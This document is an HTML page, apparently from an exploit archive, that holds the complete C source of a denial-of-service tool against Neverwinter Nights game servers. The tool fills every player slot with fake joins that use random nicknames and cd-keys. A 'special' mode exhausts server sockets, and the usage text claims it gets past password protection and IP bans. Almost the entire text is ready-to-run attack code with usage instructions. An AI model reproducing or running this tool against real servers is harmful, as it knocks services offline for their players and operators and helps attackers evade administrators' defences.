<html>
<head>
<title>Neverwinter Nights special Fake Players DoS</title>
<pre>
/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;

#ifdef WIN32
    #include &lt;winsock.h&gt;
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include &lt;string.h&gt;
#include &lt;errno.h&gt;



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = &quot;Interrupted system call&quot;; break;
        case 10009: error = &quot;Bad file number&quot;; break;
        case 10013: error = &quot;Permission denied&quot;; break;
        case 10014: error = &quot;Bad address&quot;; break;
        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
        case 10024: error = &quot;Too many open files&quot;; break;
        case 10035: error = &quot;Operation would block&quot;; break;
        case 10036: error = &quot;Operation now in progress&quot;; break;
        case 10037: error = &quot;Operation already in progress&quot;; break;
        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
        case 10039: error = &quot;Destination address required&quot;; break;
        case 10040: error = &quot;Message too long&quot;; break;
        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
        case 10042: error = &quot;Bad protocol option&quot;; break;
        case 10043: error = &quot;Protocol not supported&quot;; break;
        case 10044: error = &quot;Socket type not supported&quot;; break;
        case 10045: error = &quot;Operation not supported on socket&quot;; break;
        case 10046: error = &quot;Protocol family not supported&quot;; break;
        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
        case 10048: error = &quot;Address already in use&quot;; break;
        case 10049: error = &quot;Can't assign requested address&quot;; break;
        case 10050: error = &quot;Network is down&quot;; break;
        case 10051: error = &quot;Network is unreachable&quot;; break;
        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
        case 10053: error = &quot;Software caused connection abort&quot;; break;
        case 10054: error = &quot;Connection reset by peer&quot;; break;
        case 10055: error = &quot;No buffer space available&quot;; break;
        case 10056: error = &quot;Socket is already connected&quot;; break;
        case 10057: error = &quot;Socket is not connected&quot;; break;
        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
        case 10059: error = &quot;Too many references, can't splice&quot;; break;
        case 10060: error = &quot;Connection timed out&quot;; break;
        case 10061: error = &quot;Connection refused&quot;; break;
        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
        case 10063: error = &quot;File name too long&quot;; break;
        case 10064: error = &quot;Host is down&quot;; break;
        case 10065: error = &quot;No Route to Host&quot;; break;
        case 10066: error = &quot;Directory not empty&quot;; break;
        case 10067: error = &quot;Too many processes&quot;; break;
        case 10068: error = &quot;Too many users&quot;; break;
        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
        case 10070: error = &quot;Stale NFS file handle&quot;; break;
        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
        case 11001: error = &quot;Host not found&quot;; break;
        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
    exit(1);
}




    #define close   closesocket
    #define FIVESEC 5000
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/socket.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;arpa/inet.h&gt;
    #include &lt;netinet/in.h&gt;
    #include &lt;netdb.h&gt;

    #define FIVESEC 5
#endif



#define VER         &quot;0.1&quot;
#define BUFFSZ      2048
#define PORT        5121
#define TIMEOUT     3
#define NICKSZ      8   // if you modify here, you must modify pck1 too!

#define SEND(x)     if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&amp;peer, sizeof(peer)) \
                      &lt; 0) std_err(); \
                    fputc('.', stdout);
#define RECV        if(timeout(sd) &lt; 0) { \
                        fputs(&quot;\n&quot; \
                            &quot;Error: socket timeout, no reply received\n&quot; \
                            &quot;\n&quot;, stdout); \
                        exit(1); \
                    } \
                    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                    if(len &lt; 0) std_err(); \
                    fputc('.', stdout);



int find_gamever(u_char *data, int len);
int create_rand_string(u_char *data, int len, u_int tmp);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    u_int       seed;
    int         sd,
                i,
                len,
                on = 1,
                special   = 0,
                info_only = 0,
                ser_ver   = 0;
    u_short     port = PORT;
    u_char      buff[BUFFSZ],
                query[] =
                    &quot;\xfe\xfd\x00\x00\x00\x00\x00\xff\x00\x00&quot;,
                srvname[] =
                    &quot;BNES&quot;
                    &quot;\x00\x14&quot;
                    &quot;\x00&quot;,
                info[] =
                    &quot;BNXI&quot;
                    &quot;\x00\x14&quot;,
                pck1[] =
                    &quot;BNCS&quot;
                    &quot;\x00\x14&quot;
                    &quot;\x10&quot;
                    &quot;\x00\x00\x00\x00&quot;  // 8062 = version
                    &quot;\x03\x00&quot;
                    &quot;\x01&quot;
                    &quot;\x00\x00\x00\x00&quot;  // random
                    &quot;\x08&quot; &quot;abcdefgh&quot;   // NICKSZ and nickname
                    &quot;\x08&quot; &quot;00000000&quot;,  // cd-key
                pck2[] =
                    &quot;BNVS&quot;
                    &quot;\x50\x03&quot;
                    &quot;\x28&quot; &quot;0000000000000000000000000000000000000000&quot;
                    &quot;\x28&quot; &quot;0000000000000000000000000000000000000000&quot;
                    &quot;\x28&quot; &quot;0000000000000000000000000000000000000000&quot;
                    &quot;\x20&quot; &quot;00000000000000000000000000000000&quot;
                    &quot;\x20&quot; &quot;00000000000000000000000000000000&quot;;


    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Neverwinter Nights special Fake Players DoS &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@altervista.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 2) {
        printf(&quot;\n&quot;
            &quot;Usage: %s [options] &lt;host&gt;\n&quot;
            &quot;\n&quot;
            &quot;Options:\n&quot;
            &quot;-p PORT   server port (default %d)\n&quot;
            &quot;-s        special attack, you will be able to consume all the server sockets\n&quot;
            &quot;          simply sending less than 100 packets each time. This type of attack\n&quot;
            &quot;          is useful because the admin cannot easily ban your IP and is fast.\n&quot;
            &quot;          It is automatically enabled if the server is protected by password.\n&quot;
            &quot;       -&gt; This is the ONLY way to fill an internet server!!! Without this\n&quot;
            &quot;          option you can fill only local servers!\n&quot;
            &quot;-i        informations only, requests remote informations and exits\n&quot;
            &quot;-v VER    server version, by default this tool automatically retrieves the\n&quot;
            &quot;          exact remote version (needed for the attack)\n&quot;
            &quot;\n&quot;
            &quot; Works also versus servers protected by password without knowing the keyword!\n&quot;
            &quot;\n&quot;, argv[0], port);
        exit(1);
    }

    argc--;
    for(i = 1; i &lt; argc; i++) {
        switch(argv[i][1]) {
            case 'p': port = atoi(argv[++i]); break;
            case 's': special = 1; break;
            case 'i': info_only = 1; break;
            case 'v': ser_ver = atoi(argv[++i]); break;
            default: {
                printf(&quot;\nError: wrong command-line argument (%s)\n\n&quot;, argv[i]);
                exit(1);
            }
        }
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

    peer.sin_addr.s_addr  = resolv(argv[argc]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf(&quot;- target   %s : %hu\n&quot;,
        inet_ntoa(peer.sin_addr), port);

    fputs(&quot;- request informations:\n&quot;, stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd &lt; 0) std_err();

    SEND(srvname);
    RECV;
    if(memcmp(buff, &quot;BNER&quot;, 4)) {
        fputs(&quot;\nError: bad reply from the server\n\n&quot;, stdout);
        exit(1);
    }
    buff[buff[8] + 9] = 0x00;
    printf(&quot;\n&quot;
        &quot;  Server name                %s\n&quot;, buff + 9);

    SEND(info);
    RECV;
    close(sd);

    if(memcmp(buff, &quot;BNXR&quot;, 4)) {
        fputs(&quot;\nError: bad reply from the server\n\n&quot;, stdout);
        exit(1);
    }
    buff[buff[19] + 20] = 0x00;
    printf(&quot;\n&quot;
        &quot;  Game port                  %d\n&quot;
        &quot;  Player Password            %s\n&quot;
        &quot;  Levels                     %d -&gt; %d\n&quot;
        &quot;  Players                    %d / %d\n&quot;
        &quot;  Local Characters Allowed   %s\n&quot;
        &quot;  Player vs Player           %s\n&quot;
        &quot;  Players Pause Enabled      %s\n&quot;
        &quot;  Only One Party             %s\n&quot;
        &quot;  Enforce Legal Characters   %s\n&quot;
        &quot;  Item Level Restrictions    %s\n&quot;
        &quot;  Module                     %s\n&quot;
        &quot;\n&quot;,
        *(u_short *)(buff + 4),
        buff[7] ? &quot;on&quot; : &quot;off&quot;,
        buff[8], buff[9],
        buff[10], buff[11],
        buff[12] ? &quot;on&quot; : &quot;off&quot;,
        buff[13] ? &quot;party or full&quot; : &quot;none&quot;,
        buff[14] ? &quot;on&quot; : &quot;off&quot;,
        buff[15] ? &quot;on&quot; : &quot;off&quot;,
        buff[16] ? &quot;on&quot; : &quot;off&quot;,
        buff[17] ? &quot;on&quot; : &quot;off&quot;,
        buff + 20);

    if(info_only) return(0);

    if(!ser_ver) {
        fputs(&quot;- retrieve server version (needed!):\n&quot;, stdout);
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd &lt; 0) std_err();
        *(u_long *)(query + 3) = peer.sin_addr.s_addr;  // something random
        SEND(query);
        RECV;
        close(sd);
        ser_ver = find_gamever(buff, len);
        if(ser_ver &lt;= 0) {
            fputs(&quot;\n&quot;
                &quot;Error: no gamever field found, you must manually specify the server version\n&quot;
                &quot;       with the -v option\n&quot;
                &quot;\n&quot;, stdout);
            exit(1);
        }
    }

    printf(&quot;\n- server version             %d\n&quot;, ser_ver);
    *(u_long *)(pck1 + 7) = ser_ver;

    seed = time(NULL);

    fputs(&quot;- start attack:\n&quot;, stdout);
    for(;;) {
        for(i = 0;; i++) {
            if(special) printf(&quot;\n  Packet %d: &quot;, i);
              else fputs(&quot;\n  Player: &quot;, stdout);

            sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if(sd &lt; 0) std_err();

            if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;on, sizeof(on))
              &lt; 0) std_err();
            peerl.sin_port++;
            if(bind(sd, (struct sockaddr *)&amp;peerl, sizeof(peerl))
              &lt; 0) std_err();

            *(u_long *)(pck1 + 14) = peerl.sin_port;
            seed = create_rand_string(pck1 + 19, NICKSZ, seed);     // random nick
            seed = create_rand_string(pck1 + 20 + NICKSZ, 8, seed); // random cd-key

            SEND(pck1);
            RECV;
            if(buff[6] != 0x56) {
                if(buff[7] == 5) {
                    close(sd);
                    break;
                } else if(buff[7] == 2) {
                    fputs(&quot;\nError: wrong version, server uses another version (check the -v option)\n\n&quot;, stdout);
                    exit(1);
                } else if(buff[7] == 6) {
                    fputs(&quot;\nAlert: a player with a same name already exists, I wait 5 seconds and retry\n&quot;, stdout);
                    close(sd);
                    sleep(FIVESEC);
                    continue;
                } else if(buff[7] == 10) {
                    fputs(&quot;\nError: you are banned on this server\n\n&quot;, stdout);
                    exit(1);
                } else if(buff[7] == 12) {
                    fputs(&quot;\nError: your nickname contains wrong chars\n\n&quot;, stdout);
                    exit(1);
                } else if(buff[7] == 32) {
                    fputs(&quot;- password protection, I bypass it&quot;, stdout);
                    close(sd);
                    continue;
                } else {
                    printf(&quot;\nError: the fake player has not been accepted (error %d)\n\n&quot;, buff[7]);
                    exit(1);
                }
            }

            if(special) {
                close(sd);
                continue;
            }

            RECV;

            seed = create_rand_string(pck2 + 7,   40, seed);
            seed = create_rand_string(pck2 + 48,  40, seed);
            seed = create_rand_string(pck2 + 89,  40, seed);
            seed = create_rand_string(pck2 + 130, 32, seed);
            seed = create_rand_string(pck2 + 163, 32, seed);

            SEND(pck2);
            RECV;

            if(!memcmp(buff, &quot;BNVRR&quot;, 5)) {
                fputs(&quot;\n&quot;
                    &quot;Error: the player seems to have not been accepted.\n&quot;
                    &quot;       Remember that you must use the special attack (-s option) to fill\n&quot;
                    &quot;       internet servers!\n&quot;
                    &quot;\n&quot;, stdout);
            }

            close(sd);
        }

        fputs(&quot;- server full&quot;, stdout);
        sleep(FIVESEC);
    }

    return(0);
}



int find_gamever(u_char *data, int len) {
    int     nt = 0,
            ver = -1;
    u_char  *p,
            *limit;

    limit = data + len;
    data += 5;
    while(data &lt; limit) {
        p = strchr(data, 0x00);
        if(!p) break;
        *p = 0x00;

        if(!nt) {
            if(!*data) break;
            if(!strcmp(data, &quot;gamever&quot;)) ver = 0;
            nt++;
        } else {
            if(!ver) ver = atoi(data);
            nt = 0;
        }
        data = p + 1;
    }
    return(ver);
}



int create_rand_string(u_char *data, int len, u_int tmp) {
    if(!tmp) tmp++;
    while(len--) {
        tmp = (*data + tmp) % 62;
        if(tmp &lt;= 9) {
            *data = tmp + '0';
        } else if((tmp &gt;= 10) &amp;&amp; (tmp &lt;= 35)) {
            *data = (tmp - 10) + 'A';
        } else {
            *data = (tmp - 36) + 'a';
        }
        data++;
    }
    return(tmp &lt;&lt; 1);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&amp;fd_read);
    FD_SET(sock, &amp;fd_read);
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
    if(err &lt; 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf(&quot;\nError: Unable to resolv hostname (%s)\n&quot;, host);
            exit(1);
        } else host_ip = *(u_long *)hp-&gt;h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror(&quot;\nError&quot;);
        exit(1);
    }
#endif</pre>
//milw0rm.com
</html>

